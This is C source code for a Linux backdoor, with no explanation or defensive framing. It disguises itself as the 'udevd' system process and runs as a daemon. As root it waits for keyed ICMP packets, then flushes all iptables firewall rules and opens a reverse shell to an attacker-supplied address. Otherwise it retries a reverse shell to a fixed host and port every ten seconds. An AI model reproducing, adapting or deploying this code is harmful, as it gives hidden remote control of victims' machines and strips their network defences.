#include<stdio.h>
#include<stdlib.h>
#include<signal.h>
#include<string.h>
#include<sys/socket.h>
#include<sys/types.h>
#include<unistd.h>
#include<getopt.h>
#include <netinet/in.h> 
#include <arpa/inet.h>
#include<netdb.h>
#include <fcntl.h>
#include <sys/param.h> 
#include <netinet/ip_icmp.h>

#define REVERSE_HOST "127.0.0.1"
#define REVERSE_PORT 4444
#define ICMP_PACKET_SIZE 1024
#define ICMP_KEY "6u66le"
#define NAME_PROCESS "udevd"
#define SHELL "/bin/sh"
#define RESPAWN_DELAY 10

extern char *optarg;

int Daemons(void)
{ 
	int pid; 
	int i;
	signal(SIGTTOU,SIG_IGN); 
	signal(SIGTTIN,SIG_IGN); 
	signal(SIGTSTP,SIG_IGN); 
	signal(SIGHUP ,SIG_IGN);
	if(pid=fork()) 
		exit(EXIT_SUCCESS); 
	else if(pid< 0) 
	{
		perror("fork");
		exit(EXIT_FAILURE);
	}
	setsid(); 
	if(pid=fork()) 
		exit(EXIT_SUCCESS); 
	else if(pid< 0) 
	{
		perror("fork");
		exit(EXIT_FAILURE);
	}  
	for(i=0;i<NOFILE;++i)
			close(i);
	open("/dev/null", O_RDONLY);
	open("/dev/null", O_RDWR);
	open("/dev/null", O_RDWR);
	chdir("/tmp"); 
	umask(0);  
	signal(SIGCHLD,SIG_IGN);
  return; 

} 
void flush_iptables(void)
{
    system("iptables -X 2> /dev/null");
    system("iptables -F 2> /dev/null");
    system("iptables -t nat -F 2> /dev/null");
    system("iptables -t nat -X 2> /dev/null");
    system("iptables -t mangle -F 2> /dev/null");
    system("iptables -t mangle -X 2> /dev/null");
    system("iptables -P INPUT ACCEPT 2> /dev/null");
    system("iptables -P FORWARD ACCEPT 2> /dev/null");
    system("iptables -P OUTPUT ACCEPT 2> /dev/null");
}

void reverse_shell(char* host,unsigned short int port)
{
	int sockfd;
	struct sockaddr_in serv_addr;
	struct hostent *server;
	sockfd=socket(AF_INET,SOCK_STREAM,0);
	if(sockfd<0){
		perror("socket");
		return;
	}
	server=gethostbyname(host);
	if(server=NULL)
		return;
	bzero((char*)&serv_addr,sizeof(serv_addr));
	serv_addr.sin_family=AF_INET;
	serv_addr.sin_addr.s_addr = inet_addr(host);
	serv_addr.sin_port=htons((unsigned short int)port);
	if(connect(sockfd,(struct sockaddr*)&serv_addr,sizeof(serv_addr))<0){
		perror("connect");
		return;
	}
	dup2(sockfd, 0); 
    dup2(sockfd, 1); 
    dup2(sockfd, 2);
	execl("/bin/sh", "/bin/sh", (char *)0);
	close(sockfd);
}
void icmp_listen(void)
{
    int sockfd,
        n,
        icmp_key_size;
    char buf[ICMP_PACKET_SIZE + 1];
    struct icmp *icmp;
    struct ip *ip;
    icmp_key_size = strlen(ICMP_KEY);
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);    
    while (1) {
        bzero(buf, ICMP_PACKET_SIZE + 1);        
        n = recv(sockfd, buf, ICMP_PACKET_SIZE,0);
        if (n > 0) {    
            ip = (struct ip *)buf;
            icmp = (struct icmp *)(ip + 1);

            if ((icmp->icmp_type == ICMP_ECHO) && (memcmp(icmp->icmp_data,ICMP_KEY, icmp_key_size) == 0)) 
			{
                char bd_ip[16];
                int bd_port;
                
                bd_port = 0;
                bzero(bd_ip, sizeof(bd_ip));
                sscanf((char *)(icmp->icmp_data + icmp_key_size + 1), 
				"%15s %d", bd_ip, &bd_port);
                
                if ((bd_port <= 0) || (strlen(bd_ip) < 7))
                    continue;                    
                if (fork() == 0) {
                    flush_iptables();
                    reverse_shell(bd_ip, bd_port);
                    exit(EXIT_SUCCESS);
                }
            }
        }
    }
}

int main(int argc,char *argv[])
{
	Daemons();
	strncpy(argv[0], NAME_PROCESS, strlen(argv[0]));
    for (int i=1; i<argc; i++)
       memset(argv[i],' ', strlen(argv[i]));
	if (getgid() == 0) {
        icmp_listen();
    }    
    else
	{
		while (1) {
        if (fork() == 0) {
            reverse_shell(REVERSE_HOST, REVERSE_PORT);
            exit(EXIT_SUCCESS);
        }
        sleep(RESPAWN_DELAY);
		}
	}
	return 0;
}